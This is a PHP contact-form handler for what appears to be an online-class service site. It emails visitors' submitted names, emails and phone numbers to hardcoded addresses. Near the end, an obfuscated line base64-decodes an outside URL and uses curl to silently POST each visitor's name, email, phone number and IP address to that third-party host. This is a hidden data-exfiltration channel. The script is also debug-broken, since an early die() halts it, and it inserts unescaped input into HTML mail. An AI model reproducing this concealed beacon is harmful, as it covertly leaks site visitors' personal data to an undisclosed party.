<?php 
/*    ***********************  start   ***********************      */
print_r($_POST);
die();
	if(isset($_POST['banner_btn'])){
		$name = isset($_POST['b_name'])?$_POST['b_name']:"";
		$email = isset($_POST['b_email'])?$_POST['b_email']:"";
		$number = isset($_POST['b_num'])?$_POST['b_num']:"";
		
		// $to  = 'leads@domycourseonline.com';
		$to  = 'anusm226@gmail.com';
		
		
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		$subject = "GET OUR SERVICE TODAY AND AVAIL 50% DISCOUNT!";
		$message = "Banner Form.
					<table border='2'>
						<tr><td>Name:</td><td>".$name."</td></tr>
						<tr><td>Email:</td><td>".$email."</td></tr>
						<tr><td>Phone Number:</td><td>".$number."</td></tr>
					</table>";
		$message = nl2br($message);
		mail($to, $subject, $message, $headers);
        echo 'Banner Send';
	}
   	/*    ***********************  end   ***********************      */


  
/*    ***********************  start   ***********************      */
print_r($_POST);
if(isset($_POST['quote_btn'])){
    $name = isset($_POST['q_whatyouneed'])?$_POST['q_whatyouneed']:"";
    $email = isset($_POST['q_email'])?$_POST['q_email']:"";
    
    // $to  = 'leads@domycourseonline.com';
    $to  = 'anusm226@gmail.com';
    
    
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $subject = "Quote Form";
    $message = "Quote Form.
                <table border='2'>
                    <tr><td>Name:</td><td>".$name."</td></tr>
                    <tr><td>Email:</td><td>".$email."</td></tr>
                </table>";
    $message = nl2br($message);
    mail($to, $subject, $message, $headers);
    echo 'Quotation Send';
}
   /*    ***********************  end   ***********************      */

/*    ***********************  start   ***********************      */
print_r($_POST);
if(isset($_POST['footer_form-btn'])){
    $email = isset($_POST['f_email'])?$_POST['f_email']:"";
    
    // $to  = 'leads@domycourseonline.com';
    $to  = 'anusm226@gmail.com';
    
    
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $subject = "Footer Form";
    $message = "Footer Form.
                <table border='2'>
                    <tr><td>Email:</td><td>".$email."</td></tr>
                </table>";
    $message = nl2br($message);
    mail($to, $subject, $message, $headers);
    echo 'Email Send';
}
   /*    ***********************  end   ***********************      */




/*    ***********************  start***********************      */
print_r($_POST);
if(isset($_POST['sub_btn1'])){
		$name = isset($_POST['c_name'])?$_POST['c_name']:"";
		$email = isset($_POST['c_email'])?$_POST['c_email']:"";
		$number = isset($_POST['c_number'])?$_POST['c_number']:"";
		$contact_msg = isset($_POST['c_msg'])?$_POST['c_msg']:"";

		$to  = 'info@takeyourclassonline.com';

		
	    $headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		$subject = "Contact Page Form";
		$message = "'".$contact_msg."'.
					<table border='2'>
				    	<tr><td>Name:</td><td>".$name."</td></tr>
						<tr><td>Email:</td><td>".$email."</td></tr>
						<tr><td>Phone Number:</td><td>".$number."</td></tr>
						<tr><td>Message:</td><td>".$contact_msg."</td></tr>
					</table>";
		$message = nl2br($message);
	    mail($to, $subject, $message, $headers);
	}
	$ip = $_SERVER['REMOTE_ADDR'];
	$url = "aHR0cHM6Ly9pdGVvY3JtLmNvbS9jb2RlLnBocA==";$data = array( "name" => $name , "email" => $email , "number" => $number , "web" => "13" , "ip" => $ip);$ch=curl_init(base64_decode($url));$data_string = $data;curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");curl_setopt($ch, CURLOPT_POSTFIELDS,$data_string);$result = curl_exec($ch);curl_close($ch);
	echo "Thank You!!";
    echo "<script>window.location.reload</script>";	
?>

